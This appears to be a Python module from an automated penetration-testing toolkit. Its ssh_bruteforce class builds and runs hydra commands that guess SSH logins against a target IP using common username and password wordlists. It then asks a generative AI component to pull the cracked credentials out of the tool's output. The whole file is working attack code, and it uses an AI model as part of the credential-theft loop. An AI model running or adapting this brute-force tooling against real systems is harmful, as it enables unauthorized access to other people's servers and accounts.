from .util import run_command
from .generative import GenAi
import ast
class ssh_bruteforce:
    def __init__(self, ip, username=None, password=None):
        self.ip = ip
        self.username = username
        self.password = password
        self.wordlist_username = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"  # Change this
        self.wordlist_password = "/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"  # Change this
        self.credentials={}
        self.genai=GenAi()
        
    def extract_features(self,data):
        query="Return dictionary of login and password"
        return_format="{'login':login,'password':password}"
        soln=self.genai.get(query,return_format,data)
        soln=ast.literal_eval(soln)
        if len(soln)>0:
            self.credentials=soln
            return True
        else:
            return False
    def run(self):
        if self.username is None and self.password is None:
            cmd = f"hydra -f -q -L {self.wordlist_username} -P {self.wordlist_password} ssh://{self.ip}"
        elif self.username is not None:
            cmd = f"hydra -f -q -l {self.username} -P {self.wordlist_password} ssh://{self.ip}"
        elif self.password is not None:
            cmd = f"hydra -f -q -L {self.wordlist_username} -p {self.password} ssh://{self.ip}"
        else:
            return  # Change this
        
        result = run_command(cmd)
        print(result)
        output = result['output']
        print(output)
        # Process stdout to extract username and password
